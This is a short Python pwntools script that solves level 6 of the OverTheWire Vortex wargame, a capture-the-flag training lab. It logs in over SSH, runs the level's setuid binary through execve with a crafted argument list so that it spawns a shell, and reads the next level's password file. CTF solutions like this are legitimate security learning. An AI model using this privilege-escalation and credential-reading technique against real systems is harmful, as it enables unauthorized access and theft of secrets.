#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

level    = 6
host     = 'vortex.labs.overthewire.org'
user     = 'vortex%i' % level
chal     = 'vortex%i' % level
password  = args['PASSWORD']
passfile = '/etc/vortex_pass/vortex%i' % (level+1)
binary   = '/vortex/%s' % chal
shell    = ssh(host=host, user=user, password=password)

if not os.path.exists(chal):
    shell.download_file(binary)
    os.chmod(chal, 0755)

sh = shell.run('''
python -c "
import sys, os
os.execve(%r, ['/bin/sh'], {'a':'b'})
"
''' % binary)
sh.clean(2)

sh.sendline('id')
log.success('id: ' + sh.recvline().strip())

sh.sendline('cat %s' % passfile)
password = sh.recvline().strip()
log.success('Password: %s' % password)

print password
